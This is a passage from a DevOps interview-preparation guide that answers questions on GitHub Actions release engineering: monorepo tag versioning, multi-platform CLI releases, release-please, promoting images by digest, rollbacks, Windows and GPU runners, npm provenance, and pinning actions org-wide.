5. Nightly full build to catch anything the graph missed.

**Why →** Typical PRs touch one or two services, cutting time and cost dramatically.

**Interview tip →** Mention the nightly full build as a safety net.

</details>

### Q92. A monorepo deploys each service independently with its own version. How do you trigger and version releases? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Per-package versioning.

**What I'd do →**
1. Tags with prefixes: `api-v1.4.0`, `web-v2.1.0`; trigger `on: push: tags: ["*-v*"]`.
2. Parse service and version: `svc=${GITHUB_REF_NAME%-v*}; ver=${GITHUB_REF_NAME##*-v}`.
3. Or release-please in manifest mode (`release-please-config.json` with packages), creating per-package release PRs and tags.
4. Deploy only the tagged service via the reusable deploy workflow.

**Why →** Independent tags keep changelogs and rollbacks per service.

**Interview tip →** Mention release-please manifest mode for monorepos.

</details>

### Q93. Design a release workflow for a CLI tool that publishes binaries for Linux, macOS and Windows. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Cross-compile, checksum, sign, publish.

**What I'd do →**
1. Trigger on tags `v*.*.*`.
2. Matrix build (or GoReleaser in one job for Go), upload artifacts per platform.
3. Fan-in job downloads with `merge-multiple: true`, generates `checksums.txt`, attests provenance, and runs `gh release create "$GITHUB_REF_NAME" dist/* --generate-notes --verify-tag`.
4. Publish to Homebrew tap via App token.

**Why →** Fan-in keeps release creation atomic with all assets.

**Interview tip →** Mention checksums and provenance as part of "done".

</details>

### Q94. Releases are currently manual: someone edits the version, writes notes and tags. Automate it. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Adopt Conventional Commits and a release tool.

**What I'd do →**
1. Enforce Conventional Commit PR titles with a check and squash merges.
2. release-please on `main` maintains a release PR with version bump and changelog.
3. Merging it creates tag and release (App token so downstream workflows trigger).
4. Release workflow retags the tested image and deploys to prod with approval.

**Why →** Versioning becomes a reviewable PR instead of tribal knowledge.

**Interview tip →** Explain why the App token is needed: `GITHUB_TOKEN` tags do not trigger workflows.

</details>

### Q95. You want CD to stop at staging and let prod be promoted later by tagging. How do you design the image flow? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Promotion by digest.

**What I'd do →**
1. `main`: build, scan, push `sha-<short>`, deploy dev then staging.
2. Tag `v1.5.0` on a commit that passed staging.
3. Release workflow: verify image `sha-<short>` exists, add tag `v1.5.0` to the same manifest (ECR `put-image`), create release, deploy prod by digest.

**Why →** Prod gets exactly what staging tested, and tags are just names on the same digest.

**Interview tip →** Mention verifying the commit actually passed staging (check deployment status via API) before promoting.

</details>

### Q96. You have to roll back prod quickly. How should your workflows support that? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Rollback must be a known, rehearsed path.

**What I'd do →**
1. `workflow_dispatch` "Rollback" taking a previous version or digest, calling the same reusable deploy workflow (same approvals, possibly a faster emergency environment).
2. In-job automatic rollback on failed rollout: `kubectl rollout undo` if `rollout status` fails.
3. Keep previous images (ECR lifecycle policy retains enough releases).

**Why →** Rollback is just a deploy of an older digest when you build once and promote.

**Interview tip →** Rehearse it; a rollback path never tested is not a rollback path.

</details>

### Q97. A self-hosted Windows runner fleet is needed for .NET Framework builds. What do you watch out for? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Windows-specific runner operations.

**What I'd do →**
1. Ephemeral VMs from a golden image (Packer) with Visual Studio Build Tools, autoscaled via a VMSS or similar.
2. Run the runner as a service with a low-privilege account.
3. Use `shell: pwsh` and paths with care; long path support enabled.
4. Patch images monthly; keep runner auto-update enabled or rebuild images on new runner releases.

**Why →** Windows has no ARC-style container story for .NET Framework, so VM images are the unit.

**Interview tip →** Mention that runners too far behind the latest version stop receiving jobs.

</details>

### Q98. Jobs need GPUs only for a weekly benchmark. Cheapest setup? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Rare, expensive hardware.

**What I'd do →**
1. GitHub-hosted GPU larger runner, billed per minute, used only in that workflow.
2. Or ARC GPU scale set with `minRunners: 0` on a GPU node pool that scales from zero.
3. `timeout-minutes` strict, schedule plus dispatch triggers.

**Why →** Paying per minute for weekly use beats any always-on GPU host.

**Interview tip →** Tie infrastructure choice to utilization.

</details>

### Q99. A release must publish to npm with provenance. What does the workflow need? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** npm provenance uses GitHub OIDC.

**What I'd do →**
1. Workflow:
   ```yaml
   permissions:
     contents: read
     id-token: write
   steps:
     - uses: actions/checkout@v4
     - uses: actions/setup-node@v4
       with: { node-version: 22, registry-url: "https://registry.npmjs.org" }
     - run: npm ci && npm publish --provenance --access public
       env:
         NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}
   ```
2. Better: npm trusted publishing (OIDC) configured on npmjs.com for the repo and workflow, removing `NPM_TOKEN` entirely.

**Why →** Provenance links the package to the source and build; trusted publishing removes the long-lived token.

**Interview tip →** Mention trusted publishing exists for npm and PyPI now.

</details>

### Q100. You inherit 200 repos with unpinned actions. Plan an org-wide pinning rollout. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Scale problem; must not break builds.

**What I'd do →**
1. Inventory with code search or a script over `.github/workflows/*.yml` to list `uses:` refs.
2. Use a pinning tool (`pinact run` or `ratchet pin`) in a scripted PR per repo, adding version comments.
3. Add Dependabot config for `github-actions` in the same PR so pins stay current.
4. Merge in waves; then enable the org policy requiring SHA pinning.

**Why →** Automation makes it tractable; policy keeps it true after rollout.

**Interview tip →** "Fix existing, keep current with Dependabot, enforce with policy."

</details>

---

# Part 2: Troubleshooting

<!-- DEVOPS-SHACK:FOOTER -->
---

<div align="center">

### 🚀 Made with ❤️ by [DevOps Shack](https://www.youtube.com/@devopsshack)

**Learn DevOps, DevSecOps, Cloud and Kubernetes the practical way.**

[▶️ YouTube — DevOps Shack](https://www.youtube.com/@devopsshack) · [▶️ Hindi — @shackverse](https://www.youtube.com/@shackverse) · [🎓 devopsshack.com](https://devopsshack.com) · [📸 Instagram @devopsshack](https://www.instagram.com/devopsshack)

[🏠 Back to Home](../README.md) · [⭐ Star the original repo](https://github.com/jaiswaladi246/DevOps-Cloud-Interview-Preparation-by-DevOps-Shack)

<sub>© DevOps Shack · Licensed CC BY-NC-SA 4.0 · If you found this copy anywhere other than <a href="https://github.com/jaiswaladi246/DevOps-Cloud-Interview-Preparation-by-DevOps-Shack">github.com/jaiswaladi246</a>, the original and latest version is maintained by DevOps Shack.</sub>

</div>
<!-- /DEVOPS-SHACK:FOOTER -->
